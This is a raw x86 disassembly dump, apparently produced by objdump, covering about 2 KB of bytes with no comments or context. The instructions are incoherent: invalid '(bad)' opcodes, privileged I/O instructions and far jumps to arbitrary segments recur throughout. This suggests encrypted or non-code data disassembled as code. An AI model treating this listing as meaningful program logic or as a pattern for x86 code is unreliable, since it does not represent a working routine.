  421dac:	add    edx,DWORD PTR [edx+edi*1-0x297737d8]
  421db3:	cli    
  421db4:	jmp    0xd4da:0x7065bd92
  421dbb:	cld    
  421dbc:	daa    
  421dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dbe:	add    dh,BYTE PTR [eax+0x4]
  421dc1:	sar    BYTE PTR [esp+ebp*2+0x37],0xeb
  421dc6:	fistp  WORD PTR [ebp-0x3]
  421dc9:	les    esp,FWORD PTR [ecx+0x1b]
  421dcc:	pop    esp
  421dcd:	jne    0x421e45
  421dcf:	or     DWORD PTR [edx-0x344a8c75],esp
  421dd5:	das    
  421dd6:	std    
  421dd7:	adc    al,0x4f
  421dd9:	pop    ebp
  421dda:	(bad)  
  421ddb:	iret   
  421ddc:	xlat   BYTE PTR ds:[ebx]
  421ddd:	ficomp DWORD PTR [edx]
  421ddf:	loopne 0x421e08
  421de1:	imul   ebx,DWORD PTR [esi],0xffffffa4
  421de4:	sahf   
  421de5:	xchg   esp,eax
  421de6:	stc    
  421de7:	push   ss
  421de8:	sub    eax,0x32815764
  421ded:	jmp    0x421e3b
  421def:	xchg   ecx,eax
  421df0:	or     DWORD PTR [ebx],0x5e
  421df3:	xlat   BYTE PTR ds:[ebx]
  421df4:	ins    DWORD PTR es:[edi],dx
  421df5:	(bad)  
  421df6:	ror    BYTE PTR [esi],1
  421df8:	xchg   esi,eax
  421df9:	push   ebx
  421dfa:	loopne 0x421d9a
  421dfc:	clc    
  421dfd:	jno    0x421d85
  421dff:	out    0x2d,eax
  421e01:	mov    al,ds:0x7ac95108
  421e06:	inc    eax
  421e07:	test   eax,0xe85bf86f
  421e0c:	xchg   BYTE PTR [edi],bh
  421e0e:	ins    DWORD PTR es:[edi],dx
  421e0f:	pop    ecx
  421e10:	in     al,dx
  421e11:	xor    dl,BYTE PTR [ebx-0x3]
  421e14:	pop    ebp
  421e15:	mov    cl,0xe8
  421e17:	test   dh,0x6e
  421e1a:	add    ebx,ebx
  421e1c:	imul   eax,DWORD PTR [edx+0x4cd7b43c],0x76
  421e23:	neg    BYTE PTR [eax+0x60]
  421e26:	and    ch,BYTE PTR [ebp+0xfd45916]
  421e2c:	inc    edx
  421e2d:	or     al,BYTE PTR [esp+ebx*2-0x554fba35]
  421e34:	frstor [esi+0x3a50668c]
  421e3a:	and    al,0xa1
  421e3c:	arpl   WORD PTR [esi+0x2d],dx
  421e3f:	cli    
  421e40:	inc    ecx
  421e41:	dec    edx
  421e42:	sbb    DWORD PTR [ecx],edx
  421e44:	bound  esp,QWORD PTR [esp+esi*1+0x2c923d3]
  421e4b:	pop    eax
  421e4c:	jl     0x421e6d
  421e4e:	push   0x2b
  421e50:	or     DWORD PTR [esi+0x6b100a58],esi
  421e56:	mov    ebp,DWORD PTR [eax+0x1a]
  421e59:	cmc    
  421e5a:	lea    ebx,[ecx+0x1e89f46a]
  421e60:	loopne 0x421de6
  421e62:	outs   dx,DWORD PTR ds:[esi]
  421e63:	jae    0x421e55
  421e65:	(bad)  
  421e66:	mul    al
  421e68:	cli    
  421e69:	fisub  WORD PTR [esi+0x2]
  421e6c:	dec    esi
  421e6d:	push   cs
  421e6e:	push   esp
  421e6f:	mov    ds,eax
  421e71:	inc    eax
  421e72:	push   DWORD PTR [edx+0x4]
  421e75:	push   0x34a789d2
  421e7a:	dec    edx
  421e7b:	jmp    0x5214:0x2ac30fc8
  421e82:	xchg   esp,eax
  421e83:	and    ah,cl
  421e85:	jb     0x421e67
  421e87:	sbb    al,0x19
  421e89:	pop    edi
  421e8a:	mov    eax,ds:0x3c47cf57
  421e8f:	imul   eax,DWORD PTR [edi-0x1c],0x7c1f8546
  421e96:	lock out dx,al
  421e98:	repz xchg ebp,eax
  421e9a:	icebp  
  421e9b:	into   
  421e9c:	mov    ds:0x835abe5d,al
  421ea1:	pushf  
  421ea2:	shl    DWORD PTR [ebx+ecx*8+0x50bc74ef],1
  421ea9:	ins    DWORD PTR es:[edi],dx
  421eaa:	sub    ch,ch
  421eac:	pushf  
  421ead:	adc    eax,0x26287b40
  421eb2:	bound  ebx,QWORD PTR [esi-0x46]
  421eb5:	add    eax,ecx
  421eb7:	outs   dx,BYTE PTR ds:[esi]
  421eb8:	mov    ebp,0xd77d0352
  421ebd:	push   esi
  421ebe:	xor    BYTE PTR [ecx],al
  421ec0:	loopne 0x421f2b
  421ec2:	adc    dl,ch
  421ec4:	jmp    0x264571dc
  421ec9:	(bad)  
  421ecb:	mov    eax,0x463768e8
  421ed0:	outs   dx,BYTE PTR ds:[esi]
  421ed1:	adc    eax,0x2c2d2833
  421ed6:	or     BYTE PTR [eax-0x13f8e8fb],cl
  421edc:	test   BYTE PTR [esi],cl
  421ede:	push   ecx
  421edf:	ret    0xba7a
  421ee2:	mov    ds:0x510c2015,al
  421ee7:	push   ss
  421ee8:	sub    eax,0x19546b2e
  421eed:	and    BYTE PTR [eax+0x58],dh
  421ef0:	stos   BYTE PTR es:[edi],al
  421ef1:	inc    esi
  421ef2:	retf   0x4cd6
  421ef5:	lea    esp,[ebx]
  421ef7:	je     0x421ead
  421ef9:	fwait
  421efa:	and    esp,DWORD PTR [ecx-0x1d]
  421efd:	sub    ebx,eax
  421eff:	icebp  
  421f00:	cli    
  421f01:	xor    edi,DWORD PTR [edx-0x31761962]
  421f07:	out    0xa4,eax
  421f09:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  421f0b:	add    eax,0x14c037e1
  421f10:	jmp    0xd273:0xcc385327
  421f17:	mov    ch,0xd2
  421f19:	dec    esi
  421f1a:	mov    ds:0xf47a3bf8,ax
  421f20:	out    dx,eax
  421f21:	push   0x66e149c7
  421f26:	mov    al,ds:0x19d4f3e3
  421f2b:	inc    ebp
  421f2c:	mov    eax,ds:0xb3a76a3
  421f31:	and    dl,BYTE PTR [ebp+0x26]
  421f34:	sub    DWORD PTR ds:0x20d900f1,esp
  421f3a:	inc    ecx
  421f3b:	mul    BYTE PTR [edi-0x67de5431]
  421f41:	pop    esi
  421f42:	and    eax,ebp
  421f44:	outs   dx,BYTE PTR ds:[esi]
  421f45:	outs   dx,DWORD PTR ds:[esi]
  421f46:	ror    edi,0xe3
  421f49:	(bad)  
  421f4a:	cmp    al,BYTE PTR [esi+0x27]
  421f4d:	imul   edx,ebx,0x6e
  421f50:	retf   0xf290
  421f53:	out    dx,al
  421f54:	rcr    BYTE PTR [esi],cl
  421f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f57:	jp     0x421fc9
  421f59:	mov    eax,0xe4d93f13
  421f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f5f:	ss int 0x80
  421f62:	or     eax,0x9a35a307
  421f67:	test   eax,0xdedab34f
  421f6c:	push   esp
  421f6d:	pop    ebp
	...
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [ebx+edx*2-0x6527f30f],bl
  421f8c:	add    DWORD PTR [eax],eax
  421f8e:	cld    
  421f8f:	add    DWORD PTR [eax],eax
  421f91:	add    BYTE PTR [eax-0x52dfd5a2],bl
  421f97:	mov    ecx,0xde3d0cd7
  421f9c:	stc    
  421f9d:	jmp    0xb18b:0xad17cde5
  421fa4:	and    ah,ch
  421fa6:	push   esp
  421fa7:	mov    edi,DWORD PTR [eax+0x6c]
  421faa:	dec    BYTE PTR [edi-0x233eb303]
  421fb0:	aam    0xbb
  421fb2:	imul   esi,esi,0xffffffa9
  421fb5:	scas   eax,DWORD PTR es:[edi]
  421fb6:	aad    0x2a
  421fb8:	push   ss
  421fb9:	ja     0x421f4b
  421fbb:	mov    eax,0x602377b1
  421fc0:	sahf   
  421fc1:	das    
  421fc2:	cmc    
  421fc3:	mov    ah,BYTE PTR [edx-0x4f]
  421fc6:	xor    bh,BYTE PTR [ebx]
  421fc8:	icebp  
  421fc9:	and    eax,0xa3ed7073
  421fce:	das    
  421fcf:	inc    ebx
  421fd0:	fmul   DWORD PTR [ebp+0x78]
  421fd3:	imul   DWORD PTR gs:[edi-0x383622a8]
  421fda:	add    DWORD PTR [ebx],ebp
  421fdc:	jmp    0x587097e8
  421fe1:	mov    ebx,0xaba4952d
  421fe6:	push   esi
  421fe7:	rcr    BYTE PTR [ebx+0x61],0x60
  421feb:	push   es
  421fec:	or     dl,dl
  421fee:	add    DWORD PTR [edx+0x1],0x6e
  421ff2:	jmp    0x7955:0xd08fca17
  421ff9:	push   ds
  421ffa:	popf   
  421ffb:	sbb    cl,cl
  421ffd:	je     0x421fba
  421fff:	mov    BYTE PTR fs:[esi-0x2],dl
  422003:	xchg   ebp,eax
  422004:	dec    edx
  422005:	(bad)  
  422007:	xor    ebx,ebx
  422009:	mov    fs,WORD PTR [ecx-0x6]
  42200c:	rcr    DWORD PTR [edi+0x56],0x52
  422010:	dec    ebp
  422011:	sub    DWORD PTR [ebp+0x383afb4],0x4f8185f4
  42201b:	dec    ebp
  42201c:	xchg   ecx,eax
  42201d:	jo     0x421fae
  42201f:	fbstp  TBYTE PTR [ebp+0x3d]
  422022:	mov    ds:0x931b8f54,al
  422027:	lahf   
  422028:	sbb    eax,0x62a06429
  42202d:	jmp    0x42202f
  42202f:	cmp    BYTE PTR [ebx-0x31],ah
  422032:	sbb    bh,dl
  422034:	popa   
  422035:	jno    0x422029
  422037:	jo     0x422002
  422039:	sahf   
  42203a:	push   ss
  42203b:	ret    
  42203c:	out    dx,eax
  42203d:	inc    ecx
  42203e:	mov    esp,0xb9cedcd5
  422043:	call   0xcfb1:0xf166e072
  42204a:	push   ebx
  42204b:	sbb    ebx,DWORD PTR [ebp-0x4c9f466c]
  422051:	ss add eax,0xaa7a8196
  422057:	or     eax,DWORD PTR [esi-0x3e]
  42205a:	loop   0x422031
  42205c:	mov    edi,0xe3abdc85
  422061:	pop    ds
  422062:	and    ch,ch
  422064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422065:	imul   eax,edx,0xffffffcc
  422068:	sub    eax,0x5a0a58fc
  42206d:	neg    BYTE PTR [esi-0x49]
  422070:	aad    0xda
  422072:	pop    esi
  422073:	xor    BYTE PTR [ebx],0xf7
  422076:	mov    gs,WORD PTR [edi]
  422078:	aam    0x66
  42207a:	and    al,0x0
  42207c:	push   ds
  42207d:	pop    ebp
  42207e:	sbb    ebp,DWORD PTR [edx+0x45acc421]
  422084:	jns    0x4220fa
  422086:	mov    ds:0x210a76a3,al
  42208b:	jle    0x42206b
  42208d:	xor    DWORD PTR [ecx-0x6013cff2],ebx
  422093:	dec    eax
  422094:	and    BYTE PTR [ebx-0x555f713d],dl
  42209a:	nop
  42209b:	loope  0x4220c8
  42209d:	and    DWORD PTR [ebx+0x79],esi
  4220a0:	xchg   ecx,eax
  4220a1:	xchg   dl,dl
  4220a3:	add    ch,BYTE PTR [ebp-0x12208a7b]
  4220a9:	mov    bl,0x88
  4220ab:	arpl   WORD PTR [esi],sp
  4220ad:	neg    DWORD PTR [eax]
  4220af:	popf   
  4220b0:	(bad)  
  4220b2:	add    ch,BYTE PTR [ecx+0x6e]
  4220b5:	je     0x422122
  4220b7:	mov    ebp,DWORD PTR ds:0xaeedc179
  4220bd:	adc    bl,BYTE PTR [edx-0xbed4b5d]
  4220c3:	inc    edi
  4220c4:	pop    ecx
  4220c5:	adc    bl,BYTE PTR [ebx+0x20]
  4220c8:	in     eax,0xff
  4220ca:	mov    edx,0xc3dc9897
  4220cf:	das    
  4220d0:	mov    bp,0x6f3d
  4220d4:	jg     0x4220b9
  4220d6:	shl    DWORD PTR [eax-0x40c86316],0xb1
  4220dd:	mov    esp,0x3cd929fb
  4220e2:	cmc    
  4220e3:	jnp    0x422099
  4220e5:	scas   eax,DWORD PTR es:[edi]
  4220e6:	push   eax
  4220e7:	pop    ss
  4220e8:	jle    0x422098
  4220ea:	rcl    DWORD PTR [ecx-0x1d7824a0],0x4a
  4220f1:	je     0x4220fb
  4220f3:	lods   al,BYTE PTR ds:[esi]
  4220f4:	aas    
  4220f5:	dec    ebx
  4220f6:	mov    ah,0x8d
  4220f8:	fidivr DWORD PTR [ebp+0x44]
  4220fb:	push   ebp
  4220fc:	jns    0x422141
  4220fe:	adc    eax,0x3a00dfe7
  422103:	pop    edi
  422104:	sbb    al,0x1b
  422106:	push   ecx
  422107:	inc    edx
  422108:	cdq    
  422109:	pop    ecx
  42210a:	jb     0x422167
  42210c:	jnp    0x4220d8
  42210e:	mov    WORD PTR ds:0x9d4243bc,es
  422114:	or     edi,DWORD PTR [edx-0x6a]
  422117:	lds    ebp,FWORD PTR [ebx+0x30322d32]
  42211d:	pop    ebp
  42211e:	out    dx,eax
  42211f:	lods   eax,DWORD PTR ds:[esi]
  422120:	int3   
  422121:	ja     0x42218b
  422123:	aam    0x83
  422125:	jae    0x42215c
  422127:	push   esp
  422128:	in     al,dx
  422129:	inc    edx
  42212a:	mov    ss,WORD PTR [eax]
  42212c:	loope  0x4220b4
  42212e:	jl     0x4220e7
  422130:	daa    
  422131:	sbb    DWORD PTR gs:[edx+0xef50d9f],edi
  422138:	push   0xc9ef70a1
  42213d:	mov    dh,0x3a
  42213f:	cli    
  422140:	sub    eax,DWORD PTR [edi]
  422142:	mov    BYTE PTR [edx-0x1d55ee37],0x9e
  422149:	adc    BYTE PTR [ecx-0xc],bh
  42214c:	scas   al,BYTE PTR es:[edi]
  42214d:	push   cs
  42214e:	pop    eax
  42214f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422150:	ret    0xe91a
  422153:	cmp    DWORD PTR [ebp+0x5df57de7],ebp
  422159:	(bad)  
  42215a:	das    
  42215b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215c:	lods   eax,DWORD PTR ds:[esi]
  42215d:	jae    0x422195
  42215f:	sub    ebp,DWORD PTR [edx-0x78cd1b14]
  422165:	in     al,dx
  422166:	sahf   
  422167:	fstp   QWORD PTR [ebx+0x1622e8ca]
  42216d:	sbb    ebx,DWORD PTR [eax]
  42216f:	daa    
  422170:	jo     0x42219f
  422172:	sub    al,0x47
  422174:	add    BYTE PTR [eax+eax*2-0x79295678],0x5a
  42217c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217d:	call   0x77b52afe
  422182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422183:	xchg   esi,eax
  422184:	add    eax,0xcb6c7bbf
  422189:	sub    DWORD PTR [edx+0xf4c7b6],ebx
	...
  422197:	add    BYTE PTR [eax],al
  422199:	add    BYTE PTR [ebx-0x2a],dl
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp+0x52],0xd45a6dc5
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	cld    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [ebx+0x29],dl
  4221b4:	cmp    eax,0x5eb2143f
  4221b9:	cmp    DWORD PTR [edi+0x44],ebp
  4221bc:	adc    DWORD PTR [ebx-0x17],ebp
  4221bf:	call   0x8320f470
  4221c4:	fstp   QWORD PTR [ebp+0x4cf3519e]
  4221ca:	mov    esp,0xa9e85ddc
  4221cf:	jnp    0x422233
  4221d1:	add    cl,BYTE PTR [ebp+0x5f]
  4221d4:	jge    0x422216
  4221d6:	dec    edx
  4221d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d9:	add    eax,0x28f89dd8
  4221de:	push   esi
  4221df:	rcl    BYTE PTR [esi+0x44],cl
  4221e2:	jge    0x4221fb
  4221e4:	js     0x42217a
  4221e6:	pop    ebx
  4221e7:	and    BYTE PTR ds:[ebp-0x56],0x2b
  4221ec:	jmp    0xcc6f94f9
  4221f1:	dec    ebx
  4221f2:	sbb    al,BYTE PTR [edx-0x29]
  4221f5:	ret    
  4221f6:	inc    ebp
  4221f7:	mov    fs,WORD PTR [esi-0x61]
  4221fa:	sub    DWORD PTR [ecx],ecx
  4221fc:	div    BYTE PTR [ebx+eax*8+0x63]
  422200:	inc    edx
  422201:	dec    ebx
  422203:	mov    bh,0x4
  422205:	inc    ebx
  422206:	lods   al,BYTE PTR ds:[esi]
  422207:	mov    cl,bl
  422209:	jl     0x4221da
  42220b:	sar    DWORD PTR [eax+ebx*1-0x47155456],1
  422212:	popf   
  422213:	xor    al,0x8
  422215:	popf   
  422216:	jno    0x4221be
  422218:	mov    ebp,0x7d1d4e59
  42221d:	dec    BYTE PTR [ecx+0x16]
  422220:	lock dec esi
  422222:	jne    0x4221b1
  422224:	shl    BYTE PTR [ebx],1
  422226:	mov    edi,0x6dd732ee
  42222b:	pop    edx
  42222c:	and    al,0x4d
  42222e:	mov    edi,0x8adf52a
  422233:	fcmovnbe st,st(2)
  422235:	test   BYTE PTR [edx],dl
  422237:	inc    ecx
  422238:	inc    esi
  422239:	xlat   BYTE PTR ds:[ebx]
  42223a:	mov    al,0xb0
  42223c:	mov    bl,0x3f
  42223e:	popf   
  42223f:	inc    eax
  422240:	mov    DWORD PTR [esi+0xafcaa1a],edx
  422246:	retf   0x280c
  422249:	add    BYTE PTR [ebx+0x7d],bl
  42224c:	(bad)  
  42224d:	cmp    bh,BYTE PTR [esp+eiz*2]
  422250:	lods   al,BYTE PTR ds:[esi]
  422251:	aam    0x3b
  422253:	pusha  
  422254:	aad    0x2a
  422256:	retf   0x7e1f
  422259:	movd   DWORD PTR ds:0x8c55fd98,mm7
  422260:	loopne 0x422279
  422262:	or     BYTE PTR [edi-0x40],dl
  422265:	jno    0x4221ec
  422267:	repz (bad) 
  422269:	hlt    
  42226a:	(bad)  
  42226b:	mov    BYTE PTR es:[ecx-0x3c],al
  42226f:	nop
  422270:	cmp    al,0xee
  422272:	sahf   
  422273:	cmp    ch,BYTE PTR [eax]
  422275:	push   edx
  422276:	les    edi,FWORD PTR ss:[edx-0x14]
  42227a:	in     al,dx
  42227b:	wrmsr  
  42227d:	jmp    0x4222a8
  42227f:	fdivr  QWORD PTR [edx]
  422281:	loop   0x422262
  422283:	adc    BYTE PTR [edx-0x29],0x79
  422287:	xchg   ch,bh
  422289:	cmp    eax,DWORD PTR [esi-0x14]
  42228c:	jbe    0x4222a4
  42228e:	loop   0x42223d
  422290:	out    0x5a,eax
  422292:	xchg   DWORD PTR [ecx-0x1936853],esp
  422298:	mov    al,0x3b
  42229a:	cmc    
  42229b:	adc    al,0x2c
  42229d:	les    ecx,FWORD PTR [edx+0x4991637a]
  4222a3:	xchg   BYTE PTR [ebp-0xa],ah
  4222a6:	jmp    0x8421:0xa6c000bd
  4222ad:	clc    
  4222ae:	enter  0xc855,0x13
  4222b2:	adc    eax,eax
  4222b4:	inc    edx
  4222b5:	jmp    0xac05:0x9a620479
  4222bc:	outs   dx,DWORD PTR ds:[esi]
  4222bd:	repz push ebx
  4222bf:	sbb    DWORD PTR [esi],edi
  4222c1:	and    al,0x44
  4222c3:	adc    edx,DWORD PTR ss:[edi]
  4222c6:	push   esi
  4222c7:	(bad)  
  4222c9:	pop    ecx
  4222ca:	and    al,cl
  4222cc:	fcomp  QWORD PTR [ebx+0x1d431921]
  4222d2:	adc    al,0xd5
  4222d4:	into   
  4222d5:	jo     0x4222e9
  4222d7:	adc    eax,0xd37462cf
  4222dc:	mov    dh,0xbd
  4222de:	enter  0xf372,0x26
  4222e2:	or     bl,BYTE PTR [edi]
  4222e4:	xchg   edi,eax
  4222e5:	push   ds
  4222e6:	gs out dx,al
  4222e8:	mov    ebx,0xcc3f315e
  4222ed:	push   edi
  4222ee:	sub    al,BYTE PTR [esi+ebx*1-0x4]
  4222f2:	fwait
  4222f3:	add    DWORD PTR [ecx+eiz*2-0xd],ecx
  4222f7:	je     0x4222bc
  4222f9:	gs pop ebp
  4222fb:	pop    edi
  4222fc:	leave  
  4222fd:	dec    eax
  4222fe:	repnz rol DWORD PTR [edx+0x11d3b157],cl
  422305:	sub    ecx,ecx
  422307:	pop    edx
  422308:	nop
  422309:	call   0x26e4cebe
  42230e:	cmc    
  42230f:	into   
  422310:	hlt    
  422311:	cmp    bh,BYTE PTR [esp+esi*4+0x5dc56c95]
  422318:	xchg   ebp,eax
  422319:	adc    DWORD PTR [ecx],0x95dd3869
  42231f:	push   edi
  422320:	xchg   edx,eax
  422321:	cmp    ebp,DWORD PTR [edx]
  422323:	jb     0x422305
  422325:	hlt    
  422326:	out    0x43,eax
  422328:	inc    esp
  422329:	xor    ecx,edi
  42232b:	mov    eax,ds:0x7408de15
  422330:	push   es
  422331:	lds    edi,FWORD PTR [edx]
  422333:	mov    edi,0x2aa93347
  422338:	pushf  
  422339:	mov    ?,dx
  42233c:	ficomp DWORD PTR [eax-0x80]
  42233f:	call   0x3d45:0xf76392c6
  422346:	xchg   ebp,eax
  422347:	lods   eax,DWORD PTR ds:[esi]
  422348:	aam    0xc
  42234a:	cmc    
  42234b:	dec    ebp
  42234c:	xor    eax,0x9e3c162d
  422351:	xor    al,0xdc
  422353:	push   es
  422354:	into   
  422355:	mov    BYTE PTR [ebx+ebx*8-0x58490be3],ch
  42235c:	lock fs aad 0xbc
  422360:	push   0x4992612d
  422365:	mov    BYTE PTR [eax],ch
  422367:	push   ss
  422368:	shl    DWORD PTR [ecx+0x7e],0x42
  42236c:	xor    dl,BYTE PTR [esi+0x1a]
  42236f:	jp     0x42237b
  422371:	test   al,0xa0
  422373:	mov    dl,0x78
  422375:	cwde   
  422376:	jno    0x42237b
  422378:	outs   dx,DWORD PTR ds:[esi]
  422379:	test   eax,0xb43daceb
  42237e:	xchg   edx,eax
  42237f:	push   ebp
  422380:	mul    dl
  422382:	sbb    al,0x64
  422384:	retf   0x173c
  422387:	mov    esp,0xb5aae2bb
  42238c:	inc    ebp
  42238d:	add    eax,0x8c5b5cee
  422392:	jns    0x42239a
  422394:	xchg   ebx,eax
  422395:	repnz xor DWORD PTR ds:0xb59781de,edx
  42239c:	aam    0x79
  42239e:	and    ecx,DWORD PTR [ebx-0x114f3fb3]
  4223a4:	add    al,0x29
  4223a6:	mov    ebx,0x1b6996f1
  4223ab:	inc    edi
  4223ac:	(bad)  
  4223ad:	pop    ss
	...
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	or     edx,ebp
  4223c8:	outs   dx,BYTE PTR ds:[esi]
  4223c9:	repnz rcr BYTE PTR [esi+0x1fc0001],1
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	(bad)  
  4223d3:	lds    ebp,FWORD PTR [ebp-0x2f]
  4223d6:	and    DWORD PTR [esi+0x3c5def5e],esi
  4223dc:	push   ebx
  4223dd:	lods   al,BYTE PTR ds:[esi]
  4223de:	lds    ecx,FWORD PTR ds:0x753b64ad
  4223e4:	xor    BYTE PTR [ebx],bh
  4223e6:	mov    ch,0x33
  4223e8:	adc    BYTE PTR [eax],0x6a
  4223eb:	cs mov dh,0x66
  4223ee:	mov    dh,0x23
  4223f0:	mov    al,0x3e
  4223f2:	out    0xfe,eax
  4223f4:	(bad)  
  4223f6:	and    DWORD PTR gs:0xf9ff461a,0x49af244d
  422401:	ja     0x4223df
  422403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422404:	hlt    
  422405:	les    edx,FWORD PTR [edi-0x7]
  422408:	inc    ebx
  422409:	dec    DWORD PTR [esi]
  42240b:	mov    dl,0x6
  42240d:	dec    esp
  42240e:	repz repnz mov esi,esp
  422412:	jg     0x42248e
  422414:	(bad)  
  422416:	out    dx,eax
  422417:	loop   0x4223f1
  422419:	sbb    eax,DWORD PTR [ecx+edx*2+0x56]
  42241d:	outs   dx,BYTE PTR ds:[esi]
  42241e:	mov    dh,0x16
  422420:	test   BYTE PTR [esi+0x459a3a18],0xe7
  422427:	aad    0x34
  422429:	mov    edi,0x78bdb204
  42242e:	stc    
  42242f:	les    edx,FWORD PTR [edx-0x4bd6a4ec]
  422435:	pop    ecx
  422436:	shl    cl,0xe2
  422439:	hlt    
  42243a:	sub    DWORD PTR [edx+edx*2+0x1c6c313d],ebp
  422441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422442:	ret    
  422443:	mov    al,es:0xefe29198
  422449:	rol    edx,1
  42244b:	adc    eax,0xf0793da1
  422450:	ficom  WORD PTR [ebx]
  422452:	test   DWORD PTR [edx+0x44],ecx
  422455:	dec    esi
  422456:	ret    
  422457:	cmc    
  422458:	sub    eax,0x1b7d360b
  42245d:	out    dx,eax
  42245e:	mov    bl,0xd3
  422460:	aaa    
  422461:	ss push ds
  422463:	fs and eax,0xb17b58e9
  422469:	(bad)  
  42246a:	out    0xa,eax
  42246c:	cmp    bl,bh
  42246e:	mov    ds:0xa6e3e341,eax
  422473:	fs inc ebx
  422475:	(bad)
  422478:	push   0xffffffb6
  42247a:	xchg   ebx,eax
  42247b:	jmp    0x611d:0x83e3e54a
  422482:	and    BYTE PTR [edi+edi*8+0x66],dl
  422486:	outs   dx,DWORD PTR ds:[esi]
  422487:	lods   al,BYTE PTR ds:[esi]
  422488:	test   al,0xd
  42248a:	test   BYTE PTR [esi-0x6e],0xc5
  42248e:	xchg   esi,eax
  42248f:	mov    gs,WORD PTR [ebp-0x218d074]
  422495:	and    al,0xe2
  422497:	dec    esi
  422498:	ss inc edi
  42249a:	test   eax,0xd2c65f8f
  42249f:	adc    DWORD PTR [edi-0x6c5d622a],edi
  4224a5:	mov    ebx,0x5de3d611
  4224aa:	retf   0xc7db
  4224ad:	ja     0x42249b
  4224af:	xchg   edi,eax
  4224b0:	test   DWORD PTR ds:0x886c481b,esi
  4224b6:	mov    dl,0xba
  4224b8:	cdq    
  4224b9:	stos   DWORD PTR es:[edi],eax
  4224ba:	xor    DWORD PTR [edx-0x46],ebp
  4224bd:	popf   
  4224be:	inc    ebp
  4224bf:	(bad)  
  4224c0:	das    
  4224c1:	add    edi,eax
  4224c3:	fisubr WORD PTR [esi]
  4224c5:	fiadd  WORD PTR [ecx]
  4224c7:	aam    0xaa
  4224c9:	and    edx,esi
  4224cb:	dec    ecx
  4224cc:	rol    DWORD PTR [ebx],1
  4224ce:	add    eax,0xc0876b17
  4224d3:	adc    bl,al
  4224d5:	mov    esi,0x79b3c1bb
  4224da:	test   BYTE PTR [edi+0x17],0xb4
  4224de:	fisubr DWORD PTR [esi+0x12]
  4224e1:	mov    bl,0xbc
  4224e3:	test   DWORD PTR ds:0xfa563250,ecx
  4224e9:	dec    esi
  4224ea:	std    
  4224eb:	push   0x55
  4224ed:	fcomp  QWORD PTR [ebp+0x2d00400e]
  4224f3:	jb     0x4224f3
  4224f5:	xlat   BYTE PTR ds:[ebx]
  4224f6:	xchg   ebp,eax
  4224f7:	iret   
  4224f8:	repnz mov al,ds:0xf1bacb7f
  4224fe:	push   ds
  4224ff:	lahf   
  422500:	por    mm2,QWORD PTR [eax+0x5f]
  422504:	sub    BYTE PTR [esp+edx*1-0x5c],cl
  422508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422509:	retf   0xe52a
  42250c:	push   ebx
  42250d:	shl    dl,1
  42250f:	(bad)  
  422510:	cld    
  422511:	in     eax,0x56
  422513:	iret   
  422514:	and    al,0x53
  422516:	daa    
  422517:	aam    0x27
  422519:	adc    bh,cl
  42251b:	fisttp WORD PTR [edx+0xf]
  42251e:	and    DWORD PTR [esi-0x572bec8f],ecx
  422524:	(bad)  
  422526:	push   esp
  422527:	hlt    
  422528:	inc    ebx
  422529:	xor    al,BYTE PTR [ebx-0x27cecd59]
  42252f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422530:	ror    eax,0x67
  422533:	cld    
  422534:	rcr    esp,1
  422536:	ss xchg esp,eax
  422538:	jb     0x422517
  42253a:	mov    ?,WORD PTR [ebx-0x31]
  42253d:	fadd   st(0),st
  42253f:	push   ebx
  422540:	adc    eax,0xc9b6e6eb
  422545:	inc    edx
  422546:	push   ebx
  422547:	mov    eax,DWORD PTR [ecx]
  422549:	loopne 0x4225b6
  42254b:	xor    BYTE PTR [edi+0x3015310e],ah
  422551:	mov    eax,ds:0xdd9be14e
  422556:	mov    al,ds:0xfcf1766
  42255b:	rol    DWORD PTR [edx+ebx*2-0x690af43e],0xb9
  422563:	pop    eax
  422564:	ret    0x1e94
  422567:	neg    al
  422569:	sub    ecx,0x32
  42256c:	outs   dx,DWORD PTR ds:[esi]
  42256d:	gs aas 
  42256f:	dec    ebx
  422570:	fiadd  WORD PTR [esi-0x24]
  422573:	pop    ecx
  422574:	inc    edx
  422575:	ficom  WORD PTR [esi]
  422577:	out    0xf,al
  422579:	test   eax,0x27e540f8
  42257e:	xor    al,0x79
  422580:	cmp    eax,0xebc07436
  422585:	or     dl,BYTE PTR [eax+edi*4+0x35]
  422589:	ror    DWORD PTR [edx+eax*4+0x73],0x36
  42258e:	std    
  42258f:	leave  
  422590:	mov    ch,0x79
  422592:	mov    esi,DWORD PTR [ecx]
  422594:	retf   0xad9b
  422597:	cmp    DWORD PTR [edx-0x58],0x69
  42259b:	jae    0x4225fd
  42259d:	xchg   ecx,eax
  42259e:	repnz test DWORD PTR [eax],ebx
  4225a1:	jne    0x422613
  4225a3:	enter  0xedf2,0x72
  4225a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a8:	(bad)  
  4225aa:	cmp    al,0x12
